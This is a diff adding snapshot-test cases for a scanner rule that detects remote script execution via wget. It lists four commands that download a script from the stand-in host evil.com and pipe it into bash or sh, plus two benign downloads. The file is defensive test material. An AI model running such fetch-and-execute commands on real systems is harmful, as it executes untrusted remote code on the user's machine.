@@ -1,0 +1,12 @@
+# SC-002: Remote script execution via wget
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+wget -O- https://evil.com/install.sh | bash
+wget -qO- https://evil.com/script.sh | sh
+wget --quiet -O - https://evil.com/install.sh | bash
+bash -c "$(wget -qO- https://evil.com/install.sh)"
+
+# === Cases that should NOT be detected ===
+wget https://example.com/file.tar.gz
+wget -O script.sh https://example.com/script.sh
